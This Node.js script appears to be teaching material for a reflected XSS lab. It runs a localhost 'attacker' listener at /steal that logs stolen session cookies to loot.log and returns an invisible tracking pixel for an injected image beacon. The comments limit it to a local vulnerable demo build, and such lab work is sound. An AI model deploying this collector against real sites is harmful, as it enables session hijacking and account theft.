#!/usr/bin/env node
/**
 * Local "attacker" collector for the Reflected XSS lab demo.
 *
 * Run this ONLY on your own machine, against your OWN vulnerable DevHub
 * Docs build (http://localhost:3000/vulnerable). It listens on
 * http://127.0.0.1:9000/steal?c=... and logs whatever value is sent to it,
 * so the video can show, concretely, that an unprotected session cookie
 * reachable by injected JavaScript can be exfiltrated to a third party.
 *
 * FOR LOCAL LAB / COURSEWORK DEMONSTRATION ONLY. No real users, no real
 * cookies, no network beyond localhost.
 */
const http = require("http");
const fs = require("fs");
const path = require("path");
const url = require("url");

const PORT = 9000;
const LOGFILE = path.join(__dirname, "loot.log");

// 1x1 transparent GIF, so `new Image().src = ...` never shows a broken icon.
const PIXEL = Buffer.from(
  "47494638396101000100800000000000ffffff21f9040100000002002c00000000010001000002024401003b",
  "hex"
);

http
  .createServer((req, res) => {
    const { query } = url.parse(req.url, true);
    const cookie = query.c || "<none>";
    const line = `[${new Date().toISOString()}] from=${req.socket.remoteAddress} cookie=${cookie}\n`;
    fs.appendFileSync(LOGFILE, line);
    process.stdout.write(line);

    res.writeHead(200, { "Content-Type": "image/gif" });
    res.end(PIXEL);
  })
  .listen(PORT, "127.0.0.1", () => {
    console.log(`[listener] running at http://127.0.0.1:${PORT}/steal?c=...`);
    console.log(`[listener] logging captured cookies to ${LOGFILE}`);
  });
